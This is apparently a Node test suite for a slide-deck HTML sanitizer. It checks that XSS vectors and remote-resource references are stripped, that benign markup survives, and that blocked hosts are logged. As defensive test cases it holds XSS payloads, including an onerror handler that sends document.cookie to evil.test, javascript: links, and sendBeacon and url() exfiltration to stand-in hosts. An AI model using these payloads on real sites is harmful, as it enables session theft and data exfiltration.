import test from 'node:test'
import assert from 'node:assert/strict'

// the egress log has a per-user token bucket (60/min); this file sanitizes hundreds of slides, so turn it off before the
// modules read the env (the logging tests below assert on the lines)
process.env.EGRESS_LOG_PER_MIN = '0'
const { sanitizeHtmlDeck } = await import('./blocks.ts')
const { stripRemoteCssUrls } = await import('./sanitizeDsHtml.ts')

const one = (html: string): string => {
  const d = sanitizeHtmlDeck({ title: 't', slides: [html] })
  assert.ok(d, 'deck survives')
  return d.slides[0] as string
}

// ---- stripped ---------------------------------------------------------------------------------------------------------

const STRIPPED: Array<[string, string, RegExp]> = [
  ['onerror handler', '<section><img src="data:image/png;base64,AAAA" onerror="fetch(\'https://evil.test/?\'+document.cookie)"></section>', /onerror|fetch\(/i],
  ['onclick, upper case', '<section><p ONCLICK="x()">a</p></section>', /onclick/i],
  ['onload on svg', '<section><svg/onload=alert(1)><rect/></svg></section>', /onload/i],
  ['handler after a quote', '<section><div class="a"onmouseover=alert(1)>x</div></section>', /onmouseover/i],
  ['javascript: href', '<section><a href="javascript:alert(1)">x</a></section>', /javascript:/i],
  ['javascript: with tab and entity', '<section><a href="jav&#x09;ascript:alert(1)">x</a></section>', /ascript:/i],
  ['vbscript: href', '<section><a href="vbscript:msgbox(1)">x</a></section>', /vbscript:/i],
  ['data:text/html href', '<section><a href="data:text/html,<script>alert(1)</script>">x</a></section>', /data:text/i],
  ['meta refresh', '<section><meta http-equiv="refresh" content="0;url=https://evil.test/"><p>a</p></section>', /<meta|evil\.test/i],
  ['base', '<section><base href="https://evil.test/"><p>a</p></section>', /<base|evil\.test/i],
  ['link stylesheet', '<section><link rel="stylesheet" href="https://evil.test/a.css"><p>a</p></section>', /<link|evil\.test/i],
  ['link prefetch', '<section><link rel="prefetch" href="https://evil.test/a"><p>a</p></section>', /<link|evil\.test/i],
  ['iframe', '<section><iframe src="https://evil.test/"></iframe><p>a</p></section>', /<iframe|evil\.test/i],
  ['frame', '<section><frame src="https://evil.test/"><p>a</p></section>', /<frame|evil\.test/i],
  ['object', '<section><object data="https://evil.test/x"></object><p>a</p></section>', /<object|evil\.test/i],
  ['embed', '<section><embed src="https://evil.test/x"><p>a</p></section>', /<embed|evil\.test/i],
  ['form', '<section><form action="https://evil.test/"><input name="q"></form><p>a</p></section>', /<form|evil\.test/i],
  ['a ping', '<section><a href="#x" ping="https://evil.test/p">x</a></section>', /ping|evil\.test/i],
  ['remote img src', '<section><img src="https://evil.test/p.png?d=SECRET"></section>', /evil\.test|SECRET/i],
  ['remote img src, single quote', "<section><img src='https://evil.test/p.png'></section>", /evil\.test/i],
  ['protocol-relative img src', '<section><img src="//evil.test/p.png"></section>', /evil\.test/i],
  ['remote srcset', '<section><img srcset="https://evil.test/a.png 1x, data:image/png;base64,AAAA 2x"></section>', /evil\.test/i],
  ['source srcset in picture', '<section><picture><source srcset="https://evil.test/a.png"><img src="data:image/png;base64,AAAA"></picture></section>', /evil\.test/i],
  ['video poster', '<section><video poster="https://evil.test/p.png"></video></section>', /evil\.test/i],
  ['audio src', '<section><audio src="https://evil.test/a.mp3"></audio></section>', /evil\.test/i],
  ['svg image remote href', '<section><svg><image href="https://evil.test/p.png"/></svg></section>', /evil\.test/i],
  ['svg image xlink:href', '<section><svg><image xlink:href="https://evil.test/p.png"/></svg></section>', /evil\.test/i],
  ['svg use remote href', '<section><svg><use href="https://evil.test/s.svg#a"/></svg></section>', /evil\.test/i],
  ['inline style url()', '<section><div style="background:url(https://evil.test/p.png)">x</div></section>', /evil\.test/i],
  ['inline style url() with css escape', '<section><div style="background:\\75 rl(https://evil.test/p.png)">x</div></section>', /evil\.test/i],
  ['style block url()', '<section><style>.a{background:url("https://evil.test/p.png")}</style><p class="a">x</p></section>', /evil\.test/i],
  ['style block @import', '<section><style>@import url(https://evil.test/a.css);.a{color:red}</style><p class="a">x</p></section>', /evil\.test|@import/i],
  ['style block @import string', '<section><style>@import "https://evil.test/a.css";</style></section>', /evil\.test/i],
  ['svg paint attr url()', '<section><svg><rect fill="url(https://evil.test/p.svg#a)"/></svg></section>', /evil\.test/i],
  ['background attribute', '<section><table background="https://evil.test/p.png"><tr><td>x</td></tr></table></section>', /evil\.test/i],
  ['formaction', '<section><button formaction="https://evil.test/">x</button></section>', /evil\.test/i],
  ['srcdoc', '<section><div srcdoc="<script>1</script>">x</div></section>', /srcdoc/i],
  ['script', '<section><script>fetch("https://evil.test")</script><p>a</p></section>', /<script|evil\.test/i],
  ['script, spaced end tag', '<section><script>fetch(1)</script ><p>a</p></section>', /<script|fetch/i],
]
for (const [name, html, bad] of STRIPPED) {
  test(`stripped: ${name}`, () => {
    const out = one(html)
    assert.doesNotMatch(out, bad, out)
    // the rest of the slide stays
    assert.match(out, /<section/)
  })
}

// ---- kept -------------------------------------------------------------------------------------------------------------

const PNG = 'data:image/png;base64,iVBORw0KGgo='
const KEPT: Array<[string, string, RegExp]> = [
  ['inline style', '<section><div style="display:flex;gap:12px;color:#123456">x</div></section>', /style="display:flex;gap:12px;color:#123456"/],
  ['inline style with local url', `<section><div style="background:url(${PNG})">x</div></section>`, /url\(data:image\/png/],
  ['fragment url in style', '<section><div style="fill:url(#g)">x</div></section>', /url\(#g\)/],
  ['style block', '<section><style>.a{color:red;font-size:20px}</style><p class="a">x</p></section>', /<style>\.a\{color:red;font-size:20px\}<\/style>/],
  ['svg shapes', '<section><svg viewBox="0 0 10 10"><defs><linearGradient id="g"><stop offset="0" stop-color="red"/></linearGradient></defs><rect width="10" height="10" fill="url(#g)"/><path d="M0 0L5 5"/></svg></section>', /<svg viewbox="0 0 10 10">[\s\S]*<linearGradient id="g">[\s\S]*fill="url\(#g\)"/i],
  ['svg image data href', `<section><svg><image href="${PNG}" width="4" height="4"/></svg></section>`, /<image href="data:image\/png/],
  ['svg use fragment', '<section><svg><use href="#a"/></svg></section>', /<use href="#a"/],
  ['data: img', `<section><img src="${PNG}" alt="x"></section>`, /<img src="data:image\/png;base64,iVBORw0KGgo="/],
  ['data-ds-asset-id', '<section><img data-ds-asset-id="illustration_1" src="" alt=""></section>', /data-ds-asset-id="illustration_1"/],
  ['data-ds-asset-id single quote', "<section><img data-ds-asset-id='illustration_1' alt=''></section>", /data-ds-asset-id="illustration_1"/],
  ['data-ds-logo', '<section><img data-ds-logo alt=""></section>', /data-ds-logo/],
  ['https link', '<section><a href="https://example.com/x">x</a></section>', /href="https:\/\/example\.com\/x"/],
  ['mailto link', '<section><a href="mailto:a@b.co">x</a></section>', /href="mailto:a@b\.co"/],
  ['fragment link', '<section><a href="#s2">x</a></section>', /href="#s2"/],
  ['class, id, data-*, aria-*', '<section class="slide" id="s1" data-x="1" aria-label="a"><h1>t</h1></section>', /class="slide" id="s1" data-x="1" aria-label="a"/],
  ['table', '<section><table><tr><td colspan="2">a</td></tr></table></section>', /<td colspan="2">a<\/td>/],
  ['text with entities', '<section><p>a &amp; b &lt; c</p></section>', /a &amp; b &lt; c/],
]
for (const [name, html, good] of KEPT) {
  test(`kept: ${name}`, () => {
    assert.match(one(html), good)
  })
}

test('idempotent: sanitize(sanitize(x)) === sanitize(x) for every case', () => {
  for (const [, html] of [...STRIPPED, ...KEPT]) {
    const a = one(html)
    assert.equal(one(a), a, html)
  }
})

test('a hostile mixed slide keeps its layout and loses every remote reference', () => {
  const out = one(
    `<section class="slide" style="background:#fff;padding:40px"><h1 style="color:#102030">Título</h1>` +
      `<img src="https://evil.test/a.png?q=SECRET" onerror="x()"><img data-ds-asset-id="logo_1">` +
      `<div style="background-image:url('https://evil.test/b.png');width:200px">ok</div>` +
      `<a href="javascript:1" ping="https://evil.test/p">l</a><style>@import url(//evil.test/c.css);h1{font-weight:700}</style></section>`,
  )
  assert.doesNotMatch(out, /evil\.test|SECRET|onerror|javascript:|ping/i, out)
  assert.match(out, /background:#fff;padding:40px/)
  assert.match(out, /<h1 style="color:#102030">Título<\/h1>/)
  assert.match(out, /width:200px/)
  assert.match(out, /h1\{font-weight:700\}/)
  assert.match(out, /data-ds-asset-id="logo_1"/)
})

test('return shape unchanged: title, audience, author, capped slides', () => {
  const d = sanitizeHtmlDeck({ title: ' T ', audience: 'a', author: 'b', slides: ['<section>1</section>', { html: '<section>2</section>' }, '  '] })
  assert.deepEqual(d, { title: 'T', audience: 'a', author: 'b', slides: ['<section>1</section>', '<section>2</section>'] })
  assert.equal(sanitizeHtmlDeck(null), null)
  assert.equal(sanitizeHtmlDeck({ title: 'x', slides: ['<script>1</script>'] }), null)
})

test('stripRemoteCssUrls is still exported for the DS thumbnail path', () => {
  assert.equal(stripRemoteCssUrls('a{color:red;background:url(https://e.test/x)}'), 'a{color:red;}')
})

// ---- telemetry --------------------------------------------------------------------------------------------------------

test('what it removed is logged as egress_blocked (host only) through logEgress', async () => {
  const lines: string[] = []
  const { logger } = await import('./log.ts')
  const orig = logger.warn
  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
  try {
    one('<section><img src="https://evil.test/p.png?d=SECRET"><div style="background:url(https://css.evil.test/x.png)">x</div></section>')
  } finally {
    logger.warn = orig
  }
  const all = lines.join('\n')
  assert.match(all, /egress_blocked/)
  assert.match(all, /"surface":"deck"/)
  assert.match(all, /evil\.test/)
  assert.doesNotMatch(all, /SECRET|p\.png/)
})

test('a full document keeps standards mode: a doctype after a leading comment is restored', () => {
  const out = one('<!-- note --><!DOCTYPE html><html><head><style>a{color:red}</style></head><body><section>x</section></body></html>')
  assert.match(out, /^<!doctype html>/)
})

test('read path: sanitizeDeckSlideHtml cleans a stored legacy slide without a re-save', async () => {
  const { sanitizeDeckSlideHtml } = await import('./sanitizeDsHtml.ts')
  const legacy = '<section><img src="https://evil.test/x.png" onerror="y()"><p>keep</p></section>'
  const out = sanitizeDeckSlideHtml(legacy)
  assert.doesNotMatch(out, /evil\.test|onerror/)
  assert.match(out, /<p>keep<\/p>/)
  assert.equal(sanitizeDeckSlideHtml(out), out)
})

// QA r1: SVG cursor is a fetching presentation attribute, outside CSS_URL_ATTRS.
test('strips URL-bearing SVG cursor presentation attributes', () => {
  const out = one('<section><svg><path cursor="url(https://evil.test/cursor.png?d=SECRET), auto" d="M0 0"></path></svg></section>')
  assert.doesNotMatch(out, /evil\.test|SECRET/, out)
})

// QA r1: handlers are dropped but their attempted remote hosts are not logged.
test('logs host-only egress when dropping a URL-bearing handler', async () => {
  const lines: string[] = []
  const { logger } = await import('./log.ts')
  const orig = logger.warn
  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
  try {
    one(`<section><img src="${PNG}" onerror="fetch('https://evil.test/p.png?SECRET')"></section>`)
  } finally {
    logger.warn = orig
  }
  const all = lines.join('\n')
  assert.match(all, /"hosts":\["evil\.test"\]/)
  assert.doesNotMatch(all, /SECRET|p\.png/)
})

// QA r2 scope: ANY remote url() in ANY attribute value or CSS property is stripped, not just a list of names.
const REMOTE = 'url(https://evil.test/a.png?d=SECRET)'
const URL_PLACES: Array<[string, string]> = [
  ['svg fill', `<svg><rect fill="${REMOTE}"/></svg>`],
  ['svg stroke', `<svg><rect stroke="${REMOTE}"/></svg>`],
  ['svg marker-start', `<svg><path marker-start="${REMOTE}" d="M0 0"/></svg>`],
  ['svg marker-mid', `<svg><path marker-mid="${REMOTE}" d="M0 0"/></svg>`],
  ['svg marker-end', `<svg><path marker-end="${REMOTE}" d="M0 0"/></svg>`],
  ['svg mask attr', `<svg><rect mask="${REMOTE}"/></svg>`],
  ['svg clip-path attr', `<svg><rect clip-path="${REMOTE}"/></svg>`],
  ['svg filter attr', `<svg><rect filter="${REMOTE}"/></svg>`],
  ['svg cursor attr, fallback list', `<svg><rect cursor="${REMOTE}, auto"/></svg>`],
  ['svg shape-inside attr', `<svg><text shape-inside="${REMOTE}">a</text></svg>`],
  ['an unknown attribute', `<div data-bg="${REMOTE}" foo="${REMOTE}">x</div>`],
  ['style cursor', `<div style="cursor:${REMOTE}, pointer">x</div>`],
  ['style list-style-image', `<ul style="list-style-image:${REMOTE}"><li>x</li></ul>`],
  ['style border-image', `<div style="border-image:${REMOTE} 30 round">x</div>`],
  ['style border-image-source', `<div style="border-image-source:${REMOTE}">x</div>`],
  ['style mask-image', `<div style="mask-image:${REMOTE};-webkit-mask-image:${REMOTE}">x</div>`],
  ['style content', `<div style="content:${REMOTE}">x</div>`],
  ['style filter url', `<div style="filter:${REMOTE}">x</div>`],
  ['style background shorthand', `<div style="background:#fff ${REMOTE} no-repeat">x</div>`],
  ['style custom property', `<div style="--bg:${REMOTE};background:var(--bg)">x</div>`],
  ['style block cursor', `<style>.a{cursor:${REMOTE},auto}</style><p class="a">x</p>`],
  ['style block @font-face src', `<style>@font-face{font-family:f;src:${REMOTE}}</style><p>x</p>`],
  ['style in svg', `<svg><style>.a{fill:${REMOTE}}</style></svg>`],
]
for (const [name, frag] of URL_PLACES) {
  test(`remote url() stripped: ${name}`, () => {
    const out = one(`<section>${frag}</section>`)
    assert.doesNotMatch(out, /evil\.test|SECRET/, out)
    assert.equal(one(out), out, 'idempotent')
  })
}

test('local url() is kept in any attribute or property', () => {
  const out = one(`<section><svg><rect fill="url(#g)" cursor="url(${PNG}), auto"/></svg><div style="cursor:url(${PNG}),auto;mask-image:url(#m)">x</div></section>`)
  assert.match(out, /fill="url\(#g\)"/)
  assert.match(out, /cursor="url\(data:image\/png/)
  assert.match(out, /mask-image:url\(#m\)/)
})

test('a handler that names a host is logged host-only, in several shapes', async () => {
  const { logger } = await import('./log.ts')
  const orig = logger.warn
  for (const h of ["fetch('https://a.evil.test/p?SECRET')", 'new Image().src="//b.evil.test/x?SECRET"', "navigator.sendBeacon('http://c.evil.test:8080/q?SECRET')"]) {
    const lines: string[] = []
    logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
    try {
      one(`<section><p onclick="${h.replace(/"/g, '&quot;')}">x</p></section>`)
    } finally {
      logger.warn = orig
    }
    const all = lines.join('\n')
    assert.match(all, /"kind":"handler"/, h)
    assert.match(all, /evil\.test/, h)
    assert.doesNotMatch(all, /SECRET|\/p\b|\/q\b/, h)
  }
})

const HANDLER_LOG_EDGE_CASES: Array<[string, string, string]> = [
  ['userinfo', `https://user:pass@userinfo.evil.test/p.png?SECRET`, 'userinfo.evil.test'],
  ['escaped slashes', String.raw`https:\/\/escaped.evil.test/p.png?SECRET`, 'escaped.evil.test'],
  ['single-label host', `http://localhost:43143/p.png?SECRET`, 'localhost'],
]
for (const [name, url, host] of HANDLER_LOG_EDGE_CASES) {
  test(`a handler host is logged with ${name} in the URL`, async () => {
    const { logger } = await import('./log.ts')
    const orig = logger.warn
    const lines: string[] = []
    logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
    let out = ''
    try {
      out = one(`<section><p onclick="fetch('${url}')">x</p></section>`)
    } finally {
      logger.warn = orig
    }
    const all = lines.join('\n')
    assert.ok(all.includes(`"hosts":["${host}"]`), `${url}: ${all}`)
    assert.doesNotMatch(out, /onclick|SECRET/)
    assert.doesNotMatch(all, /SECRET|\/p\.png/, url)
  })
}

test('repeat reads of the same stored slide are memoized and give the same output', async () => {
  const { sanitizeDeckSlideHtml } = await import('./sanitizeDsHtml.ts')
  const html = '<section><img src="https://memo.evil.test/x.png"><p>memo</p></section>'
  const a = sanitizeDeckSlideHtml(html)
  assert.equal(sanitizeDeckSlideHtml(html), a)
  assert.doesNotMatch(a, /memo\.evil/)
})
